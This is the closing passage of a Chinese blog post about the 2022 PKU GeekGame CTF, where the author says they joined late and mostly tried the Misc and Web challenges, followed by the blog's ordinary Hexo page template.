<p>再一看怎么周六中午就结束了，于是又瞄了下题目，基本上看题再到做出来都在第二阶段了，也没啥分了，只能勉强上个榜单了</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231170349338.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231170241675.png"></p>
<p>由于时间关系咱主要就瞄了下 Misc 和 Web 题，其他题目也挺有意思的，出题水平还是很不错的，主办方的师傅们都辛苦了。</p>
<p>咱开了的题目也有好几道被卡住的，本来比赛结束的前一天晚上还想接着看的，但是中途日机器去了，于是就摸了（（</p>
<p>说来今年 GeekGame 的榜单上看到了不少新面孔，喵喵老了啊。。打不动了，躺了.gif</p>
<p>就这样吧，还是以学习为主.jpg</p>
<blockquote>
<p><strong>官方题解、题目附件和源码等资料存档：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-2nd">https://github.com/PKU-GeekGame/geekgame-2nd</a></p>
</blockquote>
<p><em>（溜了溜了喵</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2022/11/30/CTF_2022PKUGeekGame/">https://miaotony.xyz/2022/11/30/CTF_2022PKUGeekGame/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2022-11-30T19-20-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/12/18/Server_HomeLab_1_PVEsetup/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="HomeLab | 1 Proxmox Virtual Environment(PVE) 安装及配置">
                        
                        <span class="card-title">HomeLab | 1 Proxmox Virtual Environment(PVE) 安装及配置</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            哪个男孩子不想整个自己的HomeLab呢？这个系列就来说一说喵喵搞机的故事，这篇博客主要记录一下PVE安装和配置的过程喵~
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-18
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tech/" class="post-category">
                                    Tech
                                </a>
                            
                            <a href="/categories/Tech/Server/" class="post-category">
                                    Server
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tech/">
                        <span class="chip bg-color">Tech</span>
                    </a>
                    
                    <a href="/tags/Configuration/">
                        <span class="chip bg-color">Configuration</span>
                    </a>
                    
                    <a href="/tags/Server/">
                        <span class="chip bg-color">Server</span>
                    </a>
                    
                    <a href="/tags/HomeLab/">
                        <span class="chip bg-color">HomeLab</span>
                    </a>
                    
                    <a href="/tags/PVE/">
                        <span class="chip bg-color">PVE</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/10/31/CTF_2022Hackergame_0x03/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CTF | 2022 USTC Hackergame WriteUp 0x03">
                        
                        <span class="card-title">CTF | 2022 USTC Hackergame WriteUp 0x03</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            这是2022 Hackergame的wp第三部分，主要包括一些难度稍大的题目，以及喵喵的碎碎念，总之学到了许多。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-31
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者 MiaoTony 所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">452.9k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
